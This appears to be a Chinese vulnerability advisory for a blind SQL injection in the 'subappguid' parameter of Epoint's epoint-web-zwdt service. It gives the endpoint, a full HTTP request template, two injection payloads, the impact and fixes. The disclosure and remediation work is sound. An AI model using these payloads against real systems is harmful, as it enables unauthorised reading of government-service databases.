# 易点（Epoint）SQL 注入漏洞

## 漏洞描述

`epoint-web-zwdt` 系统接口：

/rest/zwdtItem/getParticipants?foreSessionClusterIntercept=true

存在 SQL 注入漏洞（布尔型）。

---

## 访问路径

http://<target>/epoint-web-zwdt/epointzwmhwz/pages/approve/index

> 该页面需要登录后获取 token。

---

## 请求示例

POST /epoint-web-zwdt/rest/zwdtItem/getParticipants?foreSessionClusterIntercept=true HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json;charset=utf-8
X-Requested-With: XMLHttpRequest
Origin: http://<target>
Referer: http://<target>/epoint-web-zwdt/...
Cookie: sid=<session_id>;

{
  "token": "<token>",
  "params": {
    "subappguid": "<subappguid>",
    "itemguid": "",
    "corptype": "31",
    "asd": ""
  }
}

---

## 注入点

参数：

subappguid

---

## Payload 示例（布尔盲注）

0dc26f27-xxxx-xxxx-xxxx-xxxxxxxxxxxx' || left(current_user,1) like 'r

或：

' OR 1=1 --

---

## 漏洞类型

- SQL Injection（布尔盲注）

---

## 影响

攻击者可利用该漏洞：

- 获取数据库用户信息
- 枚举数据库结构
- 进一步读取敏感数据

---

## 修复建议

- 使用 **预编译语句（Prepared Statement）**
- 对用户输入进行严格校验（白名单）
- 禁止直接拼接 SQL
- 增加 WAF / 输入过滤